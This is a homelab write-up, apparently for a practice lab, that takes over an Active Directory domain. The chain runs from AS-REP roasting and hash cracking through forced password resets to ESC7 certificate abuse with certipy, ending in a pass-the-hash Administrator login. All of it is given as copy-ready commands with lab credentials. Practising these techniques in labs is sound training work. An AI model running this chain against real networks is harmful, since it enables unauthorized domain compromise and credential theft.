---
title: "Dominion Breaker [EASY]"
date: 2025-11-30 18:27 +0100
categories: [labs]
tags: [Active Directory, ESC7, Certificate Abuse, PrivEsc]
image: /assets/dominionbreaker.jpg
---



# Dominion Breaker [EASY]


### Windows Active Directory environment with Certificate Based attack vectors ESC Privesc.   



Download OVA: https://is.gd/YKNn9P





## 🏠 Writeup Homelab: Full Attack Chain with ESC7 Exploitation

📌 Introduction
This Home Lab simulates a realistic Active Directory environment designed for practicing common attack techniques. As is typical in penetration testing scenarios, you are provided with initial credentials to start your assessment:

➡ Initial credentials:

#### User= b.ocean
#### PW= ItSjUstAvist0r

Your objective is to enumerate, escalate privileges, and ultimately take control of the domain.


### IP
```
192.168.178.198
```

### Domain
```
certipied.local
```

---

### 1️⃣ Enumerate Domain Users

```
rpcclient -U "b.ocean" 192.168.178.198
```


```
enumdomusers
```

<img width="302" height="152" alt="Pasted image 20250619160135" src="https://github.com/user-attachments/assets/8c6514d4-ef28-47d0-9ec9-c1477dd38e8e" />


---

### 2️⃣ AS-REP Roasting hubertus.b



```
   GetNPUsers.py -no-pass -dc-ip 192.168.178.198 certipied.local/ -usersfile users.txt
```

<img width="1819" height="313" alt="Pasted image 20250619160213" src="https://github.com/user-attachments/assets/a358ab0a-b7c5-4b8c-a213-f072196e71a3" />


---

### 3️⃣ Crack AS-REP Hash

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<img width="1149" height="235" alt="Pasted image 20250619160242" src="https://github.com/user-attachments/assets/483120cb-688e-46a7-ac03-3fb9ce898a22" />


---

### 4️⃣ BloodHound Enumeration

```
bloodhound-python -u hubertus.b -p 'pa$$w0rd' -c All -d certipied.local -ns 192.168.178.198 --zip
```


<img width="721" height="674" alt="Pasted image 20250618210701" src="https://github.com/user-attachments/assets/326a0ff0-dbfb-4986-a319-12f40a09022e" />


<img width="704" height="590" alt="Pasted image 20250618210748" src="https://github.com/user-attachments/assets/2b35c424-c948-4a62-af71-2f6b0315b68b" />





---

### 5️⃣ hubertus.b changes max.p password

```
bloodyAD -u "hubertus.b" -p 'pa$$w0rd' -d "certipied.local" --host "192.168.178.198" set password "max.p" 'MorTyR§4'
```

<img width="1339" height="91" alt="Pasted image 20250619160307" src="https://github.com/user-attachments/assets/5e47f211-6846-4332-b6d2-63b77964b500" />


---

### 6️⃣ max.p changes m.roland password

```
bloodyAD -u "max.p" -p 'MorTyR§4' -d "certipied.local" --host "192.168.178.198" set password "m.roland" 'MorTyR62'
```

<img width="1189" height="88" alt="Pasted image 20250619160325" src="https://github.com/user-attachments/assets/423984ea-0479-4d8d-af29-a4b0d603ce2a" />


---

### 7️⃣ WinRM Login as max.p (get user.txt)

```
evil-winrm -i 192.168.178.198 -u max.p -p 'MorTyR§4'
```

<img width="1327" height="757" alt="Pasted image 20250619160418" src="https://github.com/user-attachments/assets/dbc27db7-5df9-4a0b-9051-17c1dc112fd9" />


---

### 8️⃣ ESC7 Exploitation


<img width="1033" height="583" alt="Pasted image 20250618210812" src="https://github.com/user-attachments/assets/f630711e-3208-416c-90ca-9c868b7b1433" />



```
certipy-ad find -u m.roland@certipied.local -p 'MorTyR62' -dc-ip 192.168.178.198 -vulnerable -enabled

certipy-ad ca -ca 'Certipied-CA' -add-officer m.roland -u m.roland@certipied.local -p 'MorTyR62' -dc-ip 192.168.178.198

certipy-ad ca -ca 'Certipied-CA' -enable-template SubCA -u m.roland@certipied.local -p 'MorTyR62' -dc-ip 192.168.178.198

certipy-ad req -u m.roland@certipied.local -p 'MorTyR62' -ca Certipied-CA -template SubCA -upn administrator@certipied.local -dc-ip 192.168.178.198

certipy-ad ca -ca Certipied-CA -issue-request 13 -u m.roland@certipied.local -p 'MorTyR62' -dc-ip 192.168.178.198

certipy-ad req -u m.roland@certipied.local -p 'MorTyR62' -ca Certipied-CA -retrieve 13 -dc-ip 192.168.178.198

certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.178.198
```

---

### 9️⃣ WinRM Login as Administrator (get root.txt)

```
evil-winrm -i 192.168.178.198 -u administrator -H 6f8f74363eae307786d94166ba38d8d9
```

---

### 🔄 Set Back

```
certipy-ad ca -ca 'Certipied-CA' -remove-officer m.roland -u m.roland@certipied.local -p 'MorTyR62' -dc-ip 192.168.178.198

certipy-ad ca -ca 'Certipied-CA' -disable-template SubCA -u m.roland@certipied.local -p 'MorTyR62' -dc-ip 192.168.178.198
```

---

✅ **End of attack chain successfully demonstrating full domain escalation via ESC7.**

